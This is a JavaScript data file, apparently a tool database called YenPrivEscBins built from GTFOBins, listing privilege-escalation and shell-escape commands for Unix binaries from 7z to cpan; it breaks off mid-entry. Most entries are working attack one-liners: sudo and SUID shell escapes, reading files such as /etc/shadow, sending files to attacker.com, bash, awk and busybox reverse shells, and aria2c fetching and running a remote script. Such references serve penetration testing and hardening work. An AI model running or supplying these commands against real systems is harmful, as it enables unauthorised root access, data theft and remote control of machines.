/* ============================================================
   YenPrivEscBins - Binary Database
   390 Unix binaries for privilege escalation enumeration
   Source: GTFOBins (https://gtfobins.github.io)
   ============================================================ */

window.BINARIES_DATA = [

    /* ============ 7z ============ */
    {
        name: "7z",
        functions: {
            "file-read": [
                "LFILE=file_to_read\n7z a -ttar -an -so $LFILE | 7z e -ttar -si -so"
            ],
            "sudo": [
                "LFILE=file_to_read\nsudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so"
            ]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ aa-exec ============ */
    {
        name: "aa-exec",
        functions: {
            "shell": ["aa-exec /bin/sh"],
            "suid": ["sudo install -m =xs $(which aa-exec) .\n\n./aa-exec /bin/sh -p"],
            "sudo": ["sudo aa-exec /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ ab ============ */
    {
        name: "ab",
        functions: {
            "file-upload": ["URL=http://attacker.com/\nLFILE=file_to_send\nab -p $LFILE $URL"],
            "file-download": ["URL=http://attacker.com/file_to_download\nab -v2 $URL"],
            "suid": ["sudo install -m =xs $(which ab) .\n\nURL=http://attacker.com/\nLFILE=file_to_send\n./ab -p $LFILE $URL"],
            "sudo": ["URL=http://attacker.com/\nLFILE=file_to_send\nsudo ab -p $LFILE $URL"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ agetty ============ */
    {
        name: "agetty",
        functions: {
            "suid": ["sudo install -m =xs $(which agetty) .\n\n./agetty -o -p -l /bin/sh -a root tty"]
        },
        contexts: ["suid"]
    },

    /* ============ alpine ============ */
    {
        name: "alpine",
        functions: {
            "file-read": ["LFILE=file_to_read\nalpine -F \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which alpine) .\n\nLFILE=file_to_read\n./alpine -F \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo alpine -F \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ ansible-playbook ============ */
    {
        name: "ansible-playbook",
        functions: {
            "shell": ["TF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nansible-playbook $TF"],
            "sudo": ["TF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nsudo ansible-playbook $TF"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ ansible-test ============ */
    {
        name: "ansible-test",
        functions: {
            "shell": ["ansible-test shell"],
            "sudo": ["sudo ansible-test shell"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ aoss ============ */
    {
        name: "aoss",
        functions: {
            "shell": ["aoss /bin/sh"],
            "sudo": ["sudo aoss /bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ apache2ctl ============ */
    {
        name: "apache2ctl",
        functions: {
            "file-read": ["LFILE=file_to_read\napache2ctl -c \"Include $LFILE\" -k stop"],
            "sudo": ["LFILE=file_to_read\nsudo apache2ctl -c \"Include $LFILE\" -k stop"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ apt ============ */
    {
        name: "apt",
        functions: {
            "shell": ["apt changelog apt\n!/bin/sh"],
            "sudo": ["sudo apt changelog apt\n!/bin/sh\n\nTF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt install -c $TF sl\n\nsudo apt update -o APT::Update::Pre-Invoke::=/bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ apt-get ============ */
    {
        name: "apt-get",
        functions: {
            "shell": ["apt-get changelog apt\n!/bin/sh"],
            "sudo": ["sudo apt-get changelog apt\n!/bin/sh\n\nTF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt-get install -c $TF sl\n\nsudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ ar ============ */
    {
        name: "ar",
        functions: {
            "file-read": ["TF=$(mktemp -u)\nLFILE=file_to_read\nar r \"$TF\" \"$LFILE\"\ncat \"$TF\""],
            "suid": ["sudo install -m =xs $(which ar) .\n\nTF=$(mktemp -u)\nLFILE=file_to_read\n./ar r \"$TF\" \"$LFILE\"\ncat \"$TF\""],
            "sudo": ["TF=$(mktemp -u)\nLFILE=file_to_read\nsudo ar r \"$TF\" \"$LFILE\"\ncat \"$TF\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ aria2c ============ */
    {
        name: "aria2c",
        functions: {
            "command": ["COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\naria2c --on-download-error=$TF http://x\n\naria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa"],
            "file-download": ["URL=http://attacker.com/file_to_get\nLFILE=file_to_save\naria2c -o \"$LFILE\" \"$URL\""],
            "sudo": ["COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x"],
            "limited-suid": ["sudo install -m =xs $(which aria2c) .\n\nCOMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ arj ============ */
    {
        name: "arj",
        functions: {
            "file-write": ["TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\narj e \"$TF/a\" $LDIR"],
            "file-read": ["TF=$(mktemp -u)\nLFILE=file_to_read\narj a \"$TF\" \"$LFILE\"\narj p \"$TF\""],
            "suid": ["sudo install -m =xs $(which arj) .\n\nTF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\n./arj e \"$TF/a\" $LDIR"],
            "sudo": ["TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\nsudo arj e \"$TF/a\" $LDIR"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ arp ============ */
    {
        name: "arp",
        functions: {
            "file-read": ["LFILE=file_to_read\narp -v -f \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which arp) .\n\nLFILE=file_to_read\n./arp -v -f \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo arp -v -f \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ as ============ */
    {
        name: "as",
        functions: {
            "file-read": ["LFILE=file_to_read\nas @$LFILE"],
            "suid": ["sudo install -m =xs $(which as) .\n\nLFILE=file_to_read\n./as @$LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo as @$LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ ascii-xfr ============ */
    {
        name: "ascii-xfr",
        functions: {
            "file-read": ["LFILE=file_to_read\nascii-xfr -ns \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which ascii-xfr) .\n\nLFILE=file_to_read\n./ascii-xfr -ns \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo ascii-xfr -ns \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ ascii85 ============ */
    {
        name: "ascii85",
        functions: {
            "file-read": ["LFILE=file_to_read\nascii85 \"$LFILE\" | ascii85 --decode"],
            "sudo": ["LFILE=file_to_read\nsudo ascii85 \"$LFILE\" | ascii85 --decode"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ ash ============ */
    {
        name: "ash",
        functions: {
            "shell": ["ash"],
            "file-write": ["export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'"],
            "suid": ["sudo install -m =xs $(which ash) .\n\n./ash"],
            "sudo": ["sudo ash"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ aspell ============ */
    {
        name: "aspell",
        functions: {
            "file-read": ["LFILE=file_to_read\naspell -c \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which aspell) .\n\nLFILE=file_to_read\n./aspell -c \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo aspell -c \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ at ============ */
    {
        name: "at",
        functions: {
            "shell": ["echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | at now; tail -f /dev/null"],
            "command": ["COMMAND=id\necho \"$COMMAND\" | at now"],
            "sudo": ["echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | sudo at now; tail -f /dev/null"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ atobm ============ */
    {
        name: "atobm",
        functions: {
            "file-read": ["LFILE=file_to_read\natobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'"],
            "suid": ["sudo install -m =xs $(which atobm) .\n\nLFILE=file_to_read\n./atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'"],
            "sudo": ["LFILE=file_to_read\nsudo atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ awk ============ */
    {
        name: "awk",
        functions: {
            "shell": ["awk 'BEGIN {system(\"/bin/sh\")}'"],
            "reverse-shell": ["RHOST=attacker.com\nRPORT=12345\nawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"],
            "bind-shell": ["LPORT=12345\nawk -v LPORT=$LPORT 'BEGIN {\n    s = \"/inet/tcp/\" LPORT \"/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"],
            "file-write": ["LFILE=file_to_write\nawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'"],
            "file-read": ["LFILE=file_to_read\nawk '//' \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which awk) .\n\nLFILE=file_to_read\n./awk '//' \"$LFILE\""],
            "sudo": ["sudo awk 'BEGIN {system(\"/bin/sh\")}'"],
            "limited-suid": ["sudo install -m =xs $(which awk) .\n\n./awk 'BEGIN {system(\"/bin/sh\")}'"]
        },
        contexts: ["unprivileged", "suid", "sudo", "limited-suid"]
    },

    /* ============ aws ============ */
    {
        name: "aws",
        functions: {
            "shell": ["aws help\n!/bin/sh"],
            "sudo": ["sudo aws help\n!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ base32 ============ */
    {
        name: "base32",
        functions: {
            "file-read": ["LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode"],
            "suid": ["sudo install -m =xs $(which base32) .\n\nLFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode"],
            "sudo": ["LFILE=file_to_read\nsudo base32 \"$LFILE\" | base32 --decode"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ base58 ============ */
    {
        name: "base58",
        functions: {
            "file-read": ["LFILE=file_to_read\nbase58 \"$LFILE\" | base58 --decode"],
            "sudo": ["LFILE=file_to_read\nsudo base58 \"$LFILE\" | base58 --decode"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ base64 ============ */
    {
        name: "base64",
        functions: {
            "file-read": ["LFILE=file_to_read\nbase64 \"$LFILE\" | base64 --decode"],
            "suid": ["sudo install -m =xs $(which base64) .\n\nLFILE=file_to_read\n./base64 \"$LFILE\" | base64 --decode"],
            "sudo": ["LFILE=file_to_read\nsudo base64 \"$LFILE\" | base64 --decode"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ basenc ============ */
    {
        name: "basenc",
        functions: {
            "file-read": ["LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64"],
            "suid": ["sudo install -m =xs $(which basenc) .\n\nLFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64"],
            "sudo": ["LFILE=file_to_read\nsudo basenc --base64 $LFILE | basenc -d --base64"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ basez ============ */
    {
        name: "basez",
        functions: {
            "file-read": ["LFILE=file_to_read\nbasez \"$LFILE\" | basez --decode"],
            "suid": ["sudo install -m =xs $(which basez) .\n\nLFILE=file_to_read\n./basez \"$LFILE\" | basez --decode"],
            "sudo": ["LFILE=file_to_read\nsudo basez \"$LFILE\" | basez --decode"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ bash ============ */
    {
        name: "bash",
        functions: {
            "shell": ["bash"],
            "reverse-shell": ["export RHOST=attacker.com\nexport RPORT=12345\nbash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'"],
            "file-upload": ["export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nbash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(<$LFILE)\" > /dev/tcp/$RHOST/$RPORT'\n\nbash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'"],
            "file-download": ["export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nbash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'"],
            "file-write": ["export LFILE=file_to_write\nbash -c 'echo DATA > $LFILE'"],
            "file-read": ["export LFILE=file_to_read\nbash -c 'echo \"$(<$LFILE)\"'"],
            "library-load": ["bash -c 'enable -f ./lib.so x'"],
            "suid": ["sudo install -m =xs $(which bash) .\n\n./bash -p"],
            "sudo": ["sudo bash"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ batcat ============ */
    {
        name: "batcat",
        functions: {
            "shell": ["batcat --paging always /etc/profile\n!/bin/sh"],
            "sudo": ["sudo batcat --paging always /etc/profile\n!/bin/sh"],
            "limited-suid": ["sudo install -m =xs $(which batcat) .\n\n./batcat --paging always /etc/profile\n!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ bc ============ */
    {
        name: "bc",
        functions: {
            "file-read": ["LFILE=file_to_read\nbc -s $LFILE\nquit"],
            "suid": ["sudo install -m =xs $(which bc) .\n\nLFILE=file_to_read\n./bc -s $LFILE\nquit"],
            "sudo": ["LFILE=file_to_read\nsudo bc -s $LFILE\nquit"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ bconsole ============ */
    {
        name: "bconsole",
        functions: {
            "shell": ["bconsole\n@exec /bin/sh"],
            "file-read": ["bconsole -c /etc/shadow"],
            "sudo": ["sudo bconsole\n@exec /bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ bpftrace ============ */
    {
        name: "bpftrace",
        functions: {
            "sudo": ["sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'"]
        },
        contexts: ["sudo"]
    },

    /* ============ bridge ============ */
    {
        name: "bridge",
        functions: {
            "file-read": ["LFILE=file_to_read\nbridge -b \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which bridge) .\n\nLFILE=file_to_read\n./bridge -b \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo bridge -b \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ bundle ============ */
    {
        name: "bundle",
        functions: {
            "shell": ["bundle help\n!/bin/sh"],
            "sudo": ["sudo bundle help\n!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ bundler ============ */
    {
        name: "bundler",
        functions: {
            "shell": ["bundler help\n!/bin/sh"],
            "sudo": ["sudo bundler help\n!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ busctl ============ */
    {
        name: "busctl",
        functions: {
            "shell": ["busctl --show-machine\n!/bin/sh"],
            "suid": ["sudo install -m =xs $(which busctl) .\n\n./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'"],
            "sudo": ["sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ busybox ============ */
    {
        name: "busybox",
        functions: {
            "shell": ["busybox sh"],
            "reverse-shell": ["RHOST=attacker.com\nRPORT=12345\nbusybox nc -e /bin/sh $RHOST $RPORT"],
            "file-upload": ["LPORT=12345\nbusybox httpd -f -p $LPORT -h ."],
            "file-write": ["LFILE=file_to_write\nbusybox sh -c 'echo \"DATA\" > $LFILE'"],
            "file-read": ["LFILE=file_to_read\n./busybox cat \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which busybox) .\n\n./busybox sh"],
            "sudo": ["sudo busybox sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ byebug ============ */
    {
        name: "byebug",
        functions: {
            "shell": ["TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nbyebug $TF\ncontinue"],
            "sudo": ["TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue"],
            "limited-suid": ["sudo install -m =xs $(which byebug) .\n\nTF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\n./byebug $TF\ncontinue"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ bzip2 ============ */
    {
        name: "bzip2",
        functions: {
            "file-read": ["LFILE=file_to_read\nbzip2 -c $LFILE | bzip2 -d"],
            "suid": ["sudo install -m =xs $(which bzip2) .\n\nLFILE=file_to_read\n./bzip2 -c $LFILE | bzip2 -d"],
            "sudo": ["LFILE=file_to_read\nsudo bzip2 -c $LFILE | bzip2 -d"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ c89 ============ */
    {
        name: "c89",
        functions: {
            "shell": ["c89 -wrapper /bin/sh,-s ."],
            "file-write": ["LFILE=file_to_delete\nc89 -xc /dev/null -o $LFILE"],
            "file-read": ["LFILE=file_to_read\nc89 -x c -E \"$LFILE\""],
            "sudo": ["sudo c89 -wrapper /bin/sh,-s ."]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ c99 ============ */
    {
        name: "c99",
        functions: {
            "shell": ["c99 -wrapper /bin/sh,-s ."],
            "file-write": ["LFILE=file_to_delete\nc99 -xc /dev/null -o $LFILE"],
            "file-read": ["LFILE=file_to_read\nc99 -x c -E \"$LFILE\""],
            "sudo": ["sudo c99 -wrapper /bin/sh,-s ."]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ cabal ============ */
    {
        name: "cabal",
        functions: {
            "shell": ["cabal exec -- /bin/sh"],
            "suid": ["sudo install -m =xs $(which cabal) .\n\n./cabal exec -- /bin/sh -p"],
            "sudo": ["sudo cabal exec -- /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ cancel ============ */
    {
        name: "cancel",
        functions: {
            "file-upload": ["RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\ncancel -u \"$(cat $LFILE)\" -h $RHOST:$RPORT"]
        },
        contexts: ["unprivileged"]
    },

    /* ============ capsh ============ */
    {
        name: "capsh",
        functions: {
            "shell": ["capsh --"],
            "suid": ["sudo install -m =xs $(which capsh) .\n\n./capsh --gid=0 --uid=0 --"],
            "sudo": ["sudo capsh --"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ cat ============ */
    {
        name: "cat",
        functions: {
            "file-read": ["LFILE=file_to_read\ncat \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which cat) .\n\nLFILE=file_to_read\n./cat \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo cat \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ cdist ============ */
    {
        name: "cdist",
        functions: {
            "shell": ["cdist shell -s /bin/sh"],
            "sudo": ["sudo cdist shell -s /bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ certbot ============ */
    {
        name: "certbot",
        functions: {
            "shell": ["TF=$(mktemp -d)\ncertbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'"],
            "sudo": ["TF=$(mktemp -d)\nsudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ check_by_ssh ============ */
    {
        name: "check_by_ssh",
        functions: {
            "shell": ["check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx"],
            "sudo": ["sudo check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ check_cups ============ */
    {
        name: "check_cups",
        functions: {
            "file-read": ["LFILE=file_to_read\ncheck_cups --extra-opts=@$LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo check_cups --extra-opts=@$LFILE"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ check_log ============ */
    {
        name: "check_log",
        functions: {
            "file-write": ["LFILE=file_to_write\nINPUT=input_file\ncheck_log -F $INPUT -O $LFILE"],
            "file-read": ["LFILE=file_to_read\nOUTPUT=output_file\ncheck_log -F $LFILE -O $OUTPUT\ncat $OUTPUT"],
            "sudo": ["LFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ check_memory ============ */
    {
        name: "check_memory",
        functions: {
            "file-read": ["LFILE=file_to_read\ncheck_memory --extra-opts=@$LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo check_memory --extra-opts=@$LFILE"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ check_raid ============ */
    {
        name: "check_raid",
        functions: {
            "file-read": ["LFILE=file_to_read\ncheck_raid --extra-opts=@$LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo check_raid --extra-opts=@$LFILE"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ check_ssl_cert ============ */
    {
        name: "check_ssl_cert",
        functions: {
            "command": ["COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT"],
            "sudo": ["COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\numask 022\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ check_statusfile ============ */
    {
        name: "check_statusfile",
        functions: {
            "file-read": ["LFILE=file_to_read\ncheck_statusfile $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo check_statusfile $LFILE"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ chmod ============ */
    {
        name: "chmod",
        functions: {
            "suid": ["sudo install -m =xs $(which chmod) .\n\nLFILE=file_to_change\n./chmod 6777 $LFILE"],
            "sudo": ["LFILE=file_to_change\nsudo chmod 6777 $LFILE"]
        },
        contexts: ["suid", "sudo"]
    },

    /* ============ choom ============ */
    {
        name: "choom",
        functions: {
            "shell": ["choom -n 0 /bin/sh"],
            "suid": ["sudo install -m =xs $(which choom) .\n\n./choom -n 0 -- /bin/sh -p"],
            "sudo": ["sudo choom -n 0 /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ chown ============ */
    {
        name: "chown",
        functions: {
            "suid": ["sudo install -m =xs $(which chown) .\n\nLFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE"],
            "sudo": ["LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE"]
        },
        contexts: ["suid", "sudo"]
    },

    /* ============ chroot ============ */
    {
        name: "chroot",
        functions: {
            "suid": ["sudo install -m =xs $(which chroot) .\n\n./chroot / /bin/sh -p"],
            "sudo": ["sudo chroot /"]
        },
        contexts: ["suid", "sudo"]
    },

    /* ============ clamscan ============ */
    {
        name: "clamscan",
        functions: {
            "file-read": ["LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nclamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'"],
            "suid": ["sudo install -m =xs $(which clamscan) .\n\nLFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\n./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'"],
            "sudo": ["LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nsudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ cmp ============ */
    {
        name: "cmp",
        functions: {
            "file-read": ["LFILE=file_to_read\ncmp $LFILE /dev/zero -b -l"],
            "suid": ["sudo install -m =xs $(which cmp) .\n\nLFILE=file_to_read\n./cmp $LFILE /dev/zero -b -l"],
            "sudo": ["LFILE=file_to_read\nsudo cmp $LFILE /dev/zero -b -l"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ cobc ============ */
    {
        name: "cobc",
        functions: {
            "shell": ["TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\ncobc -xFj --frelax-syntax-checks $TF/x"],
            "sudo": ["TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ column ============ */
    {
        name: "column",
        functions: {
            "file-read": ["LFILE=file_to_read\ncolumn $LFILE"],
            "suid": ["sudo install -m =xs $(which column) .\n\nLFILE=file_to_read\n./column $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo column $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ comm ============ */
    {
        name: "comm",
        functions: {
            "file-read": ["LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null"],
            "suid": ["sudo install -m =xs $(which comm) .\n\nLFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null"],
            "sudo": ["LFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ composer ============ */
    {
        name: "composer",
        functions: {
            "shell": ["TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\ncomposer --working-dir=$TF run-script x"],
            "sudo": ["TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\nsudo composer --working-dir=$TF run-script x"],
            "limited-suid": ["sudo install -m =xs $(which composer) .\n\nTF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\n./composer --working-dir=$TF run-script x"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ cowsay ============ */
    {
        name: "cowsay",
        functions: {
            "shell": ["TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\ncowsay -f $TF x"],
            "sudo": ["TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowsay -f $TF x"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ cowthink ============ */
    {
        name: "cowthink",
        functions: {
            "shell": ["TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\ncowthink -f $TF x"],
            "sudo": ["TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowthink -f $TF x"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ cp ============ */
    {
        name: "cp",
        functions: {
            "file-write": ["LFILE=file_to_write\necho \"DATA\" | cp /dev/stdin \"$LFILE\""],
            "file-read": ["LFILE=file_to_read\ncp \"$LFILE\" /dev/stdout"],
            "suid": ["sudo install -m =xs $(which cp) .\n\nLFILE=file_to_write\necho \"DATA\" | ./cp /dev/stdin \"$LFILE\""],
            "sudo": ["LFILE=file_to_write\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\"\n\nsudo cp /bin/sh /bin/cp"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ cpan ============ */
    {
        name: "cpan",
        functions: {
            "shell": ["cpan\n! exec '/bin/bash'"],
